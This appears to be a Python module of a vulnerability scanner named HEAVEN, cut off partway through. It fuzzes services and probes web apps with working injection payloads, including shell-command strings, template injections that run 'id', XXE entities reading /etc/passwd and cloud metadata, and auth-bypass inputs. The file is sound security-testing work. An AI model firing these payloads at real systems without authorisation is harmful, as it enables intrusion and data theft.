"""
HEAVEN — Zero-Day Vulnerability Discovery Engine
Algorithmic detection of potential zero-day vulnerabilities through:
- Behavioural anomaly analysis (response fingerprinting)
- Differential fuzzing with mutation strategies
- Protocol conformance testing
- Memory corruption heuristics (timing-based)
- Version regression analysis
Cross-platform: Linux, macOS, Windows.
"""

from __future__ import annotations

import asyncio
import re
import string
import time
import uuid
from dataclasses import dataclass, field
from typing import Any, Optional

try:
    import aiohttp
except ImportError:
    aiohttp = None  # type: ignore[assignment]

from heaven.utils.logger import get_logger

logger = get_logger("vulnscan.zeroday")


@dataclass
class ZeroDayCandidate:
    """A potential zero-day vulnerability candidate."""
    target: str
    port: int = 0
    service: str = ""
    category: str = ""           # buffer_overflow, format_string, auth_bypass, etc.
    confidence: float = 0.0      # 0-1
    severity: str = "high"
    description: str = ""
    evidence: dict = field(default_factory=dict)
    remediation: str = ""
    cwe_id: str = ""
    technique: str = ""          # Which discovery technique found it


# ── Mutation Strategies for Fuzzing ──

class MutationEngine:
    """Generate intelligent fuzz inputs using multiple mutation strategies."""

    @staticmethod
    def buffer_overflow_payloads(max_len: int = 10000) -> list[bytes]:
        """Generate payloads for buffer overflow detection."""
        payloads = []
        # Incremental length probes
        for length in [256, 512, 1024, 2048, 4096, 8192, max_len]:
            payloads.append(b"A" * length)
            payloads.append(b"\x41" * length)  # Pattern A
            # Cyclic pattern for offset detection
            payloads.append(_cyclic_pattern(length))
        # NOP sled patterns (detection only, not execution)
        payloads.append(b"\x90" * 1024 + b"\xcc" * 4)
        # Null-byte termination tests
        payloads.append(b"A" * 100 + b"\x00" + b"B" * 100)
        return payloads

    @staticmethod
    def format_string_payloads() -> list[str]:
        """Generate format string vulnerability test payloads."""
        return [
            "%s" * 20,
            "%x." * 50,
            "%n" * 10,                    # Write detection
            "%08x." * 20,
            "AAAA" + "%08x." * 40,
            "%p." * 30,                   # Pointer leak
            "%{uuid.uuid4().hex[:8]}s",
            "%d" * 100,
            "%.16705x%n",                 # Controlled write attempt marker
            "%s%s%s%s%s%s%s%s%s%s",
        ]

    @staticmethod
    def integer_overflow_payloads() -> list[str]:
        """Generate integer overflow test values."""
        return [
            str(2**31 - 1),     # INT_MAX
            str(2**31),         # INT_MAX + 1
            str(2**32 - 1),     # UINT_MAX
            str(2**32),         # UINT_MAX + 1
            str(2**63 - 1),     # LONG_MAX
            str(-(2**31)),      # INT_MIN
            str(-(2**31) - 1),  # INT_MIN - 1
            "0", "-0", "-1",
            "99999999999999999999",
            "0x7FFFFFFF",
            "0xFFFFFFFF",
        ]

    @staticmethod
    def auth_bypass_payloads() -> list[dict]:
        """Generate authentication bypass test cases."""
        return [
            {"technique": "empty_password", "username": "admin", "password": ""},
            {"technique": "sql_auth_bypass", "username": "admin'--", "password": "x"},
            {"technique": "sql_auth_bypass2", "username": "' OR 1=1--", "password": "x"},
            {"technique": "nosql_bypass", "username": {"$gt": ""}, "password": {"$gt": ""}},
            {"technique": "null_byte", "username": "admin%00", "password": "anything"},
            {"technique": "type_juggling", "username": "admin", "password": True},
            {"technique": "array_param", "username": "admin", "password[]": ""},
            {"technique": "unicode_bypass", "username": "ädmin", "password": "password"},
            {"technique": "case_bypass", "username": "ADMIN", "password": "admin"},
            {"technique": "whitespace", "username": " admin", "password": "admin"},
            {"technique": "jwt_none", "header": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"},
        ]

    @staticmethod
    def command_injection_payloads() -> list[str]:
        """Generate OS command injection detection payloads (non-destructive)."""
        canary = uuid.uuid4().hex[:8]
        return [
            f"; echo {canary}",
            f"| echo {canary}",
            f"` echo {canary}`",
            f"$( echo {canary})",
            f"\n echo {canary}",
            f"& echo {canary} &",
            f"|| echo {canary}",
            f"&& echo {canary}",
            # Time-based detection
            "; sleep 5",
            "| sleep 5",
            "& ping -c 5 127.0.0.1 &",
            "| timeout 5",
        ]

    @staticmethod
    def header_injection_payloads() -> list[dict]:
        """Generate HTTP header injection test payloads."""
        canary = uuid.uuid4().hex[:8]
        return [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-For": "127.0.0.1, 10.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"Host": "localhost"},
            {"Host": "127.0.0.1"},
            {"X-Forwarded-Host": "evil.com"},
            {"X-Host": f"{canary}.callback.heaven.local"},
            {"Transfer-Encoding": "chunked"},  # Smuggling detection
        ]


def _cyclic_pattern(length: int) -> bytes:
    """Generate a De Bruijn sequence for offset detection."""
    charset = string.ascii_uppercase[:4]
    pattern = []
    for a in charset:
        for b in charset:
            for c in charset:
                pattern.append(f"{a}{b}{c}".encode())
                if len(b"".join(pattern)) >= length:
                    return b"".join(pattern)[:length]
    return b"".join(pattern)[:length]


# ── Protocol Fuzzer ──

class ProtocolFuzzer:
    """Fuzz network protocols for crash/anomaly detection."""

    def __init__(self, timeout: float = 5.0):
        self.timeout = timeout
        self.candidates: list[ZeroDayCandidate] = []

    async def fuzz_tcp_service(self, host: str, port: int, service: str = "") -> list[ZeroDayCandidate]:
        """Fuzz a TCP service with mutation payloads and monitor for anomalies."""
        candidates = []
        mutation = MutationEngine()

        # Buffer overflow probes
        for i, payload in enumerate(mutation.buffer_overflow_payloads()[:5]):
            result = await self._send_tcp_probe(host, port, payload)
            if result:
                anomaly = self._analyze_response_anomaly(result, "buffer_overflow", len(payload))
                if anomaly:
                    anomaly.target = f"{host}:{port}"
                    anomaly.service = service
                    anomaly.port = port
                    candidates.append(anomaly)

        # Format string probes
        for format_payload in mutation.format_string_payloads()[:5]:
            result = await self._send_tcp_probe(host, port, format_payload.encode())
            if result:
                anomaly = self._analyze_format_string_response(result, format_payload)
                if anomaly:
                    anomaly.target = f"{host}:{port}"
                    anomaly.service = service
                    anomaly.port = port
                    candidates.append(anomaly)

        return candidates

    async def _send_tcp_probe(self, host: str, port: int, payload: bytes) -> Optional[dict]:
        """Send a TCP probe and capture response characteristics."""
        try:
            start = time.time()
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=self.timeout
            )
            writer.write(payload)
            await writer.drain()

            try:
                response = await asyncio.wait_for(reader.read(4096), timeout=self.timeout)
            except asyncio.TimeoutError:
                response = b""

            elapsed = (time.time() - start) * 1000
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass

            return {
                "response": response,
                "response_len": len(response),
                "response_time_ms": elapsed,
                "payload_len": len(payload),
                "connection_reset": False,
            }
        except ConnectionResetError:
            return {"response": b"", "response_len": 0, "response_time_ms": 0,
                    "payload_len": len(payload), "connection_reset": True}
        except Exception:
            return None

    def _analyze_response_anomaly(self, result: dict, category: str, payload_len: int) -> Optional[ZeroDayCandidate]:
        """Detect anomalous responses that may indicate memory corruption."""
        # Connection reset after large payload → possible crash
        if result["connection_reset"] and payload_len > 1024:
            return ZeroDayCandidate(
                target="", category="buffer_overflow",
                confidence=0.6, severity="critical",
                description=f"Service reset after {payload_len}-byte payload (potential buffer overflow)",
                evidence={"payload_len": payload_len, "connection_reset": True},
                remediation="Review input validation and buffer bounds checking",
                cwe_id="CWE-120", technique="protocol_fuzzing",
            )

        # Abnormally long response time → possible CPU exhaustion
        if result["response_time_ms"] > 5000:
            return ZeroDayCandidate(
                target="", category="resource_exhaustion",
                confidence=0.4, severity="high",
                description=f"Abnormal response delay ({result['response_time_ms']:.0f}ms) after probe",
                evidence={"response_time_ms": result["response_time_ms"]},
                remediation="Investigate timeout handling and resource limits",
                cwe_id="CWE-400", technique="timing_analysis",
            )

        return None

    def _analyze_format_string_response(self, result: dict, payload: str) -> Optional[ZeroDayCandidate]:
        """Detect format string vulnerability indicators."""
        response_text = result["response"].decode("utf-8", errors="replace")

        # Check if response contains memory addresses (format string leak)
        hex_pattern = re.findall(r"0x[0-9a-fA-F]{6,16}", response_text)
        pointer_pattern = re.findall(r"(?:0x)?[0-9a-fA-F]{8,16}(?:\.[0-9a-fA-F]{8,16})+", response_text)

        if len(hex_pattern) > 3 or len(pointer_pattern) > 2:
            return ZeroDayCandidate(
                target="", category="format_string",
                confidence=0.7, severity="critical",
                description="Potential format string vulnerability — memory addresses leaked in response",
                evidence={"leaked_addresses": hex_pattern[:5], "payload": payload[:100]},
                remediation="Use parameterized format functions. Never pass user input as format strings.",
                cwe_id="CWE-134", technique="format_string_fuzzing",
            )
        return None


# ── Web Application Zero-Day Scanner ──

class WebZeroDayScanner:
    """Discover zero-day vulnerabilities in web applications."""

    def __init__(self, timeout: float = 10.0):
        self.timeout = timeout
        self.mutation = MutationEngine()

    async def scan_endpoint(self, session: Any, url: str,
                            params: list[str], method: str = "GET") -> list[ZeroDayCandidate]:
        """Scan a web endpoint for zero-day vulnerabilities."""
        candidates = []

        for param in params:
            # 1. Command injection
            cmdi = await self._test_command_injection(session, url, param, method)
            if cmdi:
                candidates.append(cmdi)

            # 2. SSTI (Server-Side Template Injection) — extended engine coverage
            ssti = await self._test_ssti(session, url, param, method)
            if ssti:
                candidates.append(ssti)

            # 3. Path traversal
            traversal = await self._test_path_traversal(session, url, param, method)
            if traversal:
                candidates.append(traversal)

            # 4. Integer overflow
            intover = await self._test_integer_overflow(session, url, param, method)
            if intover:
                candidates.append(intover)

            # 5. LDAP injection
            ldap = await self._test_ldap_injection(session, url, param, method)
            if ldap:
                candidates.append(ldap)

            # 6. NoSQL injection (MongoDB / Redis / Elasticsearch)
            nosql_vulns = await self._test_nosql_injection(session, url, param, method)
            candidates.extend(nosql_vulns)

            # 7. Prototype pollution (JavaScript frameworks)
            proto = await self._test_prototype_pollution(session, url, param, method)
            if proto:
                candidates.append(proto)

        # 8. Header injection (once per URL)
        header_vulns = await self._test_header_injection(session, url)
        candidates.extend(header_vulns)

        # 9. XML / XXE (once per URL)
        xxe = await self._test_xxe(session, url)
        if xxe:
            candidates.append(xxe)

        return candidates

    async def _test_command_injection(self, session: Any, url: str,
                                       param: str, method: str) -> Optional[ZeroDayCandidate]:
        """Detect command injection via time-based differential analysis."""
        try:
            # Baseline request
            t0 = time.time()
            async with session.request(method, url, params={param: "normalvalue"},
                                        timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                baseline_time = (time.time() - t0) * 1000
                await resp.text()

            # The TARGET OS is unknown — the scanner's own platform is
            # irrelevant. Try both a Unix and a Windows sleep so a Linux
            # target scanned from Windows (or vice-versa) is not missed.
            sleep_payloads = [
                ("; sleep 5", "unix"),
                ("| sleep 5", "unix_pipe"),
                ("& timeout /t 5", "windows"),
                ("& ping -n 6 127.0.0.1", "windows_ping"),
            ]
            for sleep_payload, os_kind in sleep_payloads:
                t1 = time.time()
                async with session.request(method, url, params={param: f"test{sleep_payload}"},
                                            timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    probe_time = (time.time() - t1) * 1000
                    await resp.text()

                if probe_time <= baseline_time + 4000:
                    continue
                # Reproduce — a one-off slow response is not an injection.
                t2 = time.time()
                async with session.request(method, url, params={param: f"test{sleep_payload}"},
                                            timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    probe_time2 = (time.time() - t2) * 1000
                    await resp.text()
                if probe_time2 > baseline_time + 4000:
                    return ZeroDayCandidate(
                        target=url, category="command_injection",
                        confidence=0.85, severity="critical",
                        description=(f"Time-based command injection on param '{param}' "
                                     f"({os_kind} payload, delta={probe_time - baseline_time:.0f}ms)"),
                        evidence={"param": param, "baseline_ms": baseline_time,
                                  "probe_ms": probe_time, "reproduce_ms": probe_time2,
                                  "os_kind": os_kind, "technique": "time_based"},
                        remediation="Sanitise all user inputs. Use parameterised system calls. Avoid shell=True.",
                        cwe_id="CWE-78", technique="time_based_cmdi",
                    )
        except Exception:
            pass
        return None

    async def _test_ssti(self, session: Any, url: str,
                          param: str, method: str) -> Optional[ZeroDayCandidate]:
        """
        Detect SSTI with two-round math confirmation to eliminate false positives.

        Round 1: {{7*7}} must evaluate to 49 in response (not in baseline).
        Round 2: {{6*7}} must evaluate to 42 in response (not in baseline).
        Both rounds must pass before reporting Jinja2/Nunjucks/Twig.
        Engine-specific probes use unique non-numeric fingerprints with baseline check.
        """
        try:
            # ── Baseline ───────────────────────────────────────────────────────
            async with session.request(method, url, params={param: "normalvalue"},
                                        timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                baseline = await r.text()

            # ── Two-round math confirmation for Jinja2/Nunjucks/Twig ──────────
            # Only attempt if neither target number appears in the baseline
            if "49" not in baseline and "42" not in baseline:
                try:
                    async with session.request(method, url, params={param: "{{7*7}}"},
                                                timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                        body1 = await r.text()
                    if "49" in body1 and "{{7*7}}" not in body1:
                        async with session.request(method, url, params={param: "{{6*7}}"},
                                                    timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                            body2 = await r.text()
                        if "42" in body2 and "42" not in baseline and "{{6*7}}" not in body2:
                            return ZeroDayCandidate(
                                target=url, category="ssti",
                                confidence=0.96, severity="critical",
                                description=(
                                    f"SSTI confirmed on param '{param}' — Jinja2/Nunjucks/Twig. "
                                    "Two-round math: {{7*7}}=49 AND {{6*7}}=42 both evaluated server-side. "
                                    "RCE is achievable via this template engine."
                                ),
                                evidence={"param": param,
                                          "round1": "{{7*7}} → 49",
                                          "round2": "{{6*7}} → 42",
                                          "engine": "Jinja2/Nunjucks/Twig"},
                                remediation=(
                                    "Never pass user input to template engine render functions. "
                                    "Use sandboxed environments and whitelist template expressions."
                                ),
                                cwe_id="CWE-1336", technique="ssti_two_round_math",
                            )
                except Exception:
                    pass

            # ── Engine-specific unique-fingerprint probes (baseline-checked) ──
            unique_probes = [
                # payload, expected_indicator, engine
                ("{{7*'7'}}", "7777777", "Jinja2 (string-multiply fingerprint)"),
                ("${T(java.lang.Runtime).getRuntime()}", "java.lang.Runtime", "Spring SpEL"),
                ('#set($s="")#set($s=$s.class.forName("java.lang.Runtime"))', "java.lang.Runtime", "Velocity RCE"),
                ('<%= `id` %>', "uid=", "ERB (Ruby) RCE"),
                ('${"freemarker.template.utility.Execute"?new()("id")}', "uid=", "Freemarker RCE"),
                ("{$smarty.version}", "Smarty-", "Smarty PHP"),
                ("*{7*7}", "49", "Spring Thymeleaf SpEL"),
                ("<%=7*7%>", "49", "ERB/Ruby"),
                ("#set($x=7*7)${x}", "49", "Velocity"),
                ("${7*7}", "49", "Freemarker/Groovy/Mako"),
            ]
            for payload, expected, engine in unique_probes:
                if not expected or expected in baseline:
                    continue
                try:
                    async with session.request(method, url, params={param: payload},
                                                timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                        body = await r.text()
                        if expected in body and payload not in body and expected not in baseline:
                            return ZeroDayCandidate(
                                target=url, category="ssti",
                                confidence=0.90, severity="critical",
                                description=(
                                    f"SSTI on param '{param}' — engine: {engine}. "
                                    f"Indicator '{expected}' appeared after payload injection "
                                    f"but was absent from baseline. RCE likely achievable."
                                ),
                                evidence={"param": param, "payload": payload,
                                          "expected": expected, "engine": engine},
                                remediation=(
                                    "Never pass user input to template engine render functions. "
                                    "Use sandboxed environments."
                                ),
                                cwe_id="CWE-1336", technique="ssti_engine_fingerprint",
                            )
                except Exception:
                    continue
        except Exception:
            pass
        return None

    async def _test_ldap_injection(self, session: Any, url: str,
                                    param: str, method: str) -> Optional[ZeroDayCandidate]:
        """
        Detect LDAP Injection (blind via error-based and boolean differential).
        CWE-90.
        """
        payloads_error = [
            "*)(objectClass=*",
            "*)(&(objectClass=*",
            "*)(uid=*))(|(uid=*",
            ")(|(password=*",
            "admin)(&(password=*))",
            ")(objectClass=person)(cn=*",
        ]
        try:
            # Baseline
            async with session.request(method, url, params={param: "testuser"},
                                        timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                base_body = await r.text()
                base_len  = len(base_body)

            # Error-based detection: LDAP error strings must be absent from baseline
            for payload in payloads_error:
                async with session.request(method, url, params={param: payload},
                                            timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                    body = await r.text()
                    ldap_errors = [
                        "ldap_search", "LDAPException", "Invalid DN",
                        "javax.naming", "com.sun.jndi",
                        "Bad search filter", "invalid filter",
                        "LDAP: error code", "NamingException",
                    ]
                    for err in ldap_errors:
                        if err.lower() in body.lower() and err.lower() not in base_body.lower():
                            return ZeroDayCandidate(
                                target=url, category="ldap_injection",
                                confidence=0.85, severity="high",
                                description=(
                                    f"LDAP Injection on param '{param}' — error: '{err}'. "
                                    f"May allow authentication bypass and directory enumeration."
                                ),
                                evidence={"param": param, "payload": payload, "error": err},
                                remediation=(
                                    "Escape all LDAP special characters: * ( ) \\ NUL. "
                                    "Use parameterised LDAP queries."
                                ),
                                cwe_id="CWE-90", technique="ldap_error_based",
                            )

            # Boolean differential: wildcard (*) vs impossible value
            async with session.request(method, url, params={param: "*"},
                                        timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                wild_body = await r.text()
                wild_len  = len(wild_body)

            async with session.request(method, url,
                                        params={param: "HEAVEN_LDAP_NOEXI$T_XYZ123"},
                                        timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                false_body = await r.text()
                false_len  = len(false_body)

            # If wildcard produces significantly more content → boolean LDAP injection
            if wild_len > false_len + 200 and wild_len > base_len:
                return ZeroDayCandidate(
                    target=url, category="ldap_injection",
                    confidence=0.72, severity="high",
                    description=(
                        f"Boolean LDAP Injection on param '{param}': wildcard (*) "
                        f"returns {wild_len - false_len} more bytes than impossible value."
                    ),
                    evidence={"param": param, "wildcard_len": wild_len, "false_len": false_len},
                    remediation="Escape LDAP special chars. Use parameterised queries.",
                    cwe_id="CWE-90", technique="ldap_boolean_differential",
                )
        except Exception:
            pass
        return None

    async def _test_nosql_injection(self, session: Any, url: str,
                                     param: str, method: str) -> list[ZeroDayCandidate]:
        """
        Detect NoSQL injection in MongoDB, Redis, Elasticsearch.
        Tests JSON operator injection and type confusion.
        CWE-943.
        """
        candidates = []
        import json

        try:
            # Baseline
            async with session.request(method, url, params={param: "test"},
                                        timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                base_body = await r.text()
                base_len = len(base_body)

            # MongoDB operator injection via URL parameters
            mongo_payloads = [
                {param + "[$gt]": ""},           # $gt operator
                {param + "[$ne]": "invalid"},     # $ne operator — returns all
                {param + "[$regex]": ".*"},        # regex match all
                {param + "[$exists]": "true"},     # field existence
                {param + "[$where]": "1==1"},      # $where (deprecated but possible)
            ]
            for payload_dict in mongo_payloads:
                try:
                    async with session.request(method, url, params=payload_dict,
                                                timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                        body = await r.text()
                        # If MongoDB operator returns MORE data than a specific value → injection
                        if r.status == 200 and len(body) > base_len + 100:
                            candidates.append(ZeroDayCandidate(
                                target=url, category="nosql_injection",
                                confidence=0.80, severity="critical",
                                description=(
                                    f"MongoDB NoSQL Injection on '{param}' — "
                                    f"operator '{list(payload_dict.keys())[0]}' "
                                    f"returned {len(body) - base_len} more bytes. "
                                    f"Authentication bypass or data exfiltration possible."
                                ),
                                evidence={"param": param, "payload": payload_dict,
                                          "base_len": base_len, "response_len": len(body)},
                                remediation=(
                                    "Validate that inputs are of expected type. "
                                    "Reject objects/arrays where strings are expected. "
                                    "Use mongoose schema type enforcement."
                                ),
                                cwe_id="CWE-943", technique="nosql_operator_injection",
                            ))
                            break
                except Exception:
                    continue

            # JSON body injection for POST endpoints
            if method.upper() == "POST":
                json_payloads = [
                    {param: {"$gt": ""}},
                    {param: {"$ne": None}},
                    {param: {"$regex": ".*", "$options": "i"}},
                ]
                for json_body in json_payloads:
                    try:
                        async with session.post(
                            url,
                            data=json.dumps(json_body),
                            headers={"Content-Type": "application/json"},
                            timeout=aiohttp.ClientTimeout(total=self.timeout),
                        ) as r:
                            body = await r.text()
                            if r.status == 200 and len(body) > base_len + 50:
                                candidates.append(ZeroDayCandidate(
                                    target=url, category="nosql_injection",
                                    confidence=0.82, severity="critical",
                                    description=(
                                        f"MongoDB NoSQL Injection (JSON body) on '{param}' — "
                                        f"operator injection returned excess data."
                                    ),
                                    evidence={"param": param, "payload": json_body},
                                    remediation="Validate JSON input types. Use strict schema validation.",
                                    cwe_id="CWE-943", technique="nosql_json_injection",
                                ))
                                break
                    except Exception:
                        continue

        except Exception:
            pass
        return candidates

    async def _test_prototype_pollution(self, session: Any, url: str,
                                         param: str, method: str) -> Optional[ZeroDayCandidate]:
        """
        Detect server-side prototype pollution in Node.js applications.
        Injects __proto__ and constructor.prototype keys and checks for
        reflected properties or application behaviour changes.
        CWE-1321.
        """
        import json

        pollution_payloads = [
            # URL parameter pollution
            {f"{param}[__proto__][polluted]": "heaven_proto_probe"},
            {f"{param}[constructor][prototype][polluted]": "heaven_proto_probe"},
            # Encoded variants
            {param: "__proto__[polluted]=heaven_proto_probe"},
        ]
        json_pollution = [
            {"__proto__": {"polluted": "heaven_proto_probe"}},
            {"constructor": {"prototype": {"polluted": "heaven_proto_probe"}}},
        ]

        try:
            async with session.request(method, url, params={param: "normal"},
                                        timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                proto_baseline = (await r.read()).decode("utf-8", errors="replace")

            for payload_dict in pollution_payloads:
                try:
                    async with session.request(method, url, params=payload_dict,
                                                timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                        body = await r.text()
                        if ("heaven_proto_probe" in body
                                and "heaven_proto_probe" not in proto_baseline
                                and r.status == 200):
                            return ZeroDayCandidate(
                                target=url, category="prototype_pollution",
                                confidence=0.88, severity="high",
                                description=(
                                    f"Server-Side Prototype Pollution on '{param}' — "
                                    f"polluted property reflected in response. "
                                    f"May allow RCE via gadget chains in Express/Lodash/etc."
                                ),
                                evidence={"param": param, "payload": payload_dict,
                                          "reflected_value": "heaven_proto_probe"},
                                remediation=(
                                    "Use Object.freeze(Object.prototype) or object spread. "
                                    "Patch Lodash to >=4.17.21. Validate input keys. "
                                    "Use JSON schema with additionalProperties: false."
                                ),
                                cwe_id="CWE-1321", technique="prototype_pollution_reflection",
                            )
                except Exception:
                    continue

            # JSON body pollution
            for payload in json_pollution:
                try:
                    async with session.post(
                        url,
                        data=json.dumps(payload),
                        headers={"Content-Type": "application/json"},
                        timeout=aiohttp.ClientTimeout(total=self.timeout),
                    ) as r:
                        body = await r.text()
                        if ("heaven_proto_probe" in body
                                and "heaven_proto_probe" not in proto_baseline):
                            return ZeroDayCandidate(
                                target=url, category="prototype_pollution",
                                confidence=0.90, severity="high",
                                description=(
                                    "Server-Side Prototype Pollution via JSON body — "
                                    "__proto__ key accepted and property reflected."
                                ),
                                evidence={"payload": payload, "reflected": True},
                                remediation="Strip __proto__ and constructor keys from JSON input.",
                                cwe_id="CWE-1321", technique="prototype_pollution_json",
                            )
                except Exception:
                    continue

        except Exception:
            pass
        return None

    async def _test_xxe(self, session: Any,
                         url: str) -> Optional[ZeroDayCandidate]:
        """
        Test for XML External Entity injection via multiple attack vectors.
        CWE-611.
        """
        xxe_payloads = [
            # Classic file read
            ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
             '<test>&xxe;</test>', "root:x:0", "file_read"),
            # Windows file read
            ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
             '<test>&xxe;</test>', "[extensions]", "windows_file_read"),
            # SSRF via XXE
            ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
             '<test>&xxe;</test>', "ami-id", "ssrf_cloud_metadata"),
            # Error-based XXE
            ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
             "root:", "error_based"),
            # Billion laughs DoS indicator (small payload to test)
            ('<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]>'
             '<lolz>&lol2;</lolz>', "", "dos_indicator"),
        ]

        # Baseline: plain XML post to check what indicators appear without injection
        xxe_baseline = ""
        try:
            async with session.post(
                url, data="<test/>",
                headers={"Content-Type": "application/xml"},
                timeout=aiohttp.ClientTimeout(total=self.timeout),
            ) as base_r:
                xxe_baseline = await base_r.text()
        except Exception:
            pass

        for payload, indicator, technique in xxe_payloads:
            if not indicator:
                continue
            try:
                async with session.post(
                    url,
                    data=payload,
                    headers={"Content-Type": "application/xml"},
                    timeout=aiohttp.ClientTimeout(total=self.timeout),
                ) as r:
                    body = await r.text()
                    if indicator in body and indicator not in xxe_baseline:
                        return ZeroDayCandidate(
                            target=url, category="xxe",
                            confidence=0.95, severity="critical",
                            description=(
                                f"XML External Entity (XXE) Injection — {technique}. "
                                f"Indicator '{indicator}' found in response. "
                                f"Allows reading server files and internal SSRF."
                            ),
                            evidence={"technique": technique, "indicator": indicator,
                                      "payload": payload[:200]},
                            remediation=(
                                "Disable external entity processing in your XML parser. "
                                "In Java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true). "
                                "In Python: use defusedxml."
                            ),
                            cwe_id="CWE-611", technique=f"xxe_{technique}",
                        )
            except Exception:
                continue
        return None

    async def _test_path_traversal(self, session: Any, url: str,
                                    param: str, method: str) -> Optional[ZeroDayCandidate]:
        """Detect path traversal / local file inclusion."""
        from heaven.recon.evasion_engine import PayloadObfuscator

        base_payload = "../../../etc/passwd"
        variants = PayloadObfuscator.path_traversal_obfuscate(base_payload)

        # Add Windows-specific paths
        variants.extend(["..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                         "....//....//....//etc/passwd"])

        indicators = ["root:x:0", "daemon:x:", "/bin/bash", "/bin/sh",
                       "localhost", "# Copyright"]  # Windows hosts file

        try:
            for payload in variants[:6]:
                async with session.request(method, url, params={param: payload},
                                            timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                    body = await resp.text()
                    for indicator in indicators:
                        if indicator in body:
                            return ZeroDayCandidate(
                                target=url, category="path_traversal",
                                confidence=0.9, severity="high",
                                description=f"Path traversal on param '{param}' — file contents exposed",
                                evidence={"param": param, "payload": payload,
                                          "indicator": indicator},
                                remediation="Validate and sanitise file paths. Use chroot or path canonicalisation.",
                                cwe_id="CWE-22", technique="path_traversal_fuzzing",
                            )
        except Exception:
            pass
        return None

    async def _test_integer_overflow(self, session: Any, url: str,
                                      param: str, method: str) -> Optional[ZeroDayCandidate]:
        """Detect integer overflow/underflow vulnerabilities."""
        payloads = MutationEngine.integer_overflow_payloads()

        try:
            # Baseline
            async with session.request(method, url, params={param: "1"},
                                        timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                baseline_status = resp.status
                await resp.text()  # drain the baseline response body

            for payload in payloads:
                async with session.request(method, url, params={param: payload},
                                            timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                    await resp.text()  # drain body
                    status = resp.status

                    # Server error with overflow value → potential integer overflow.
                    # NOTE: a same-status response that merely differs in length is
                    # NOT a signal — every dynamic page varies >100 bytes per
                    # request. That branch was removed: it produced pure-noise FPs.
                    if status >= 500 and baseline_status < 500:
                        return ZeroDayCandidate(
                            target=url, category="integer_overflow",
                            confidence=0.5, severity="high",
                            description=f"Server error with integer boundary value '{payload}' on param '{param}'",
                            evidence={"param": param, "payload": payload,
                                      "baseline_status": baseline_status, "error_status": status},
                            remediation="Validate numeric inputs. Use appropriate data types with bounds checking.",
                            cwe_id="CWE-190", technique="integer_boundary_testing",
                        )
        except Exception:
            pass
        return None

    async def _test_header_injection(self, session: Any,
                                      url: str) -> list[ZeroDayCandidate]:
        """Test for HTTP header-based vulnerabilities."""
        candidates = []
        header_payloads = MutationEngine.header_injection_payloads()

        try:
            # Baseline without injection headers
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                baseline_body = await resp.text()
                baseline_status = resp.status

            for headers in header_payloads[:5]:
                async with session.get(url, headers=headers,
                                        timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                    body = await resp.text()
                    status = resp.status

                    # Different content with Host header change → host header injection
                    key = list(headers.keys())[0]
                    if key == "Host" and body != baseline_body and status == 200:
                        candidates.append(ZeroDayCandidate(
                            target=url, category="host_header_injection",
                            confidence=0.7, severity="medium",
                            description=f"Host header injection — different response with Host: {headers['Host']}",
                            evidence={"header": key, "value": headers[key],
                                      "body_differs": True},
                            remediation="Validate Host header. Use server-configured hostname.",
                            cwe_id="CWE-644", technique="header_injection",
                        ))
                        break

                    # IP bypass: different status with X-Forwarded-For
                    if key.startswith("X-") and status != baseline_status:
                        candidates.append(ZeroDayCandidate(
                            target=url, category="ip_restriction_bypass",
                            confidence=0.6, severity="high",
                            description=f"IP restriction bypass via {key}: {headers[key]}",
                            evidence={"header": key, "value": headers[key],
                                      "baseline_status": baseline_status, "bypass_status": status},
                            remediation="Do not trust client-supplied IP headers for access control.",
                            cwe_id="CWE-290", technique="header_bypass",
                        ))
        except Exception:
            pass

        return candidates


# ── Version Regression Analyzer ──

class VersionRegressionAnalyzer:
    """Detect services running versions with known regression patterns."""

    # Services where specific version transitions introduced vulnerabilities
    REGRESSION_DB: dict[str, list[dict]] = {
        "openssh": [
            {"affected": ["8.5", "8.5p1", "8.6", "8.6p1", "8.7", "8.7p1", "8.8", "8.8p1", "9.0", "9.0p1",
                          "9.1", "9.1p1", "9.2", "9.2p1", "9.3", "9.3p1", "9.4", "9.4p1", "9.5", "9.5p1",
                          "9.6", "9.6p1", "9.7", "9.7p1"],
             "cve": "CVE-2024-6387", "name": "regreSSHion", "severity": "critical",
             "desc": "Race condition in signal handler allowing RCE"},
        ],
        "apache": [
            {"affected": ["2.4.49", "2.4.50"],
             "cve": "CVE-2021-41773", "name": "Path Traversal", "severity": "critical",
